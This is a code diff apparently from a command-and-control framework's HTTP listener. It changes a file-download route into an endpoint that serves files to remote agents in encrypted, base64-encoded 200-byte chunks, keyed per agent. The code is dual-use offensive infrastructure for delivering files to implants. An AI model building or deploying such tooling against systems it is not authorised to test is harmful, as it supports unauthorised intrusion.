@@ -5,6 +5,7 @@ from io import BytesIO
 from core.logger import *
 from core.crypto import *
 from random import choice
+from base64 import b64encode
 from string import ascii_letters
 from multiprocessing import Process
 from os import path, getcwd
@@ -20,7 +21,8 @@ class HTTP_listener:
         self.debug = debug
 
         self.stash = stash
-        self.filePath = path.join(getcwd(), 'downloads')
+        self.downloadPath = path.join(getcwd(), 'downloads')
+        self.uploadPath = path.join(getcwd(), 'uploads')
         self.certPath = path.join(getcwd(), 'certs', 'cert.pem')
         self.privkeyPath = path.join(getcwd(), 'certs', 'key.pem')
 
@@ -103,13 +105,30 @@ class HTTP_listener:
                 return (render_template(f'404.html', title = '404'), 404)
 
         # user command input will put the file here with user choosen name
-        @self.app.route('/download/<file>', methods=['GET'])
+        @self.app.route('/upload/<file>', methods=['POST'])
         def download(file):
             # print(path.join(self.filePath, file))
-            file_path = path.join(self.filePath, file)
-            if path.isfile(file_path):
-                
-                return (send_from_directory(self.filePath, file, as_attachment=True), 200)
+            file_to_split = path.join(self.uploadPath, file)
+            part = request.form.get('part')
+            name = request.form.get('name')
+            key = self.stash.get_agent_key(agent=name)
+            ## optimise this bloody waste of resources
+            if path.isfile(file_to_split):
+                # return (send_from_directory(self.uploadPath, file, as_attachment=True), 200)
+                # ## new download function
+                with open(file_to_split,'rb') as rb:
+                    file_bin = rb.read()
+                file_bin_arr = [file_bin[i:i+200] for i in range(0, len(file_bin), 200)]
+                # file_bin_arr.append(b'xxxDONExxx')
+                file_b64_arr = [b64encode(x) for x in file_bin_arr]
+
+                if part == 'init':
+                    send_it = ENCRYPT(f'VALID {len(file_b64_arr)}', key)
+                else:
+                    send_it = ENCRYPT(f'VALID {file_b64_arr[int(part)].decode()}', key)
+
+                return (send_it, 200)
+
             else:
                 return (render_template(f'404.html', title = '404'), 404)
 
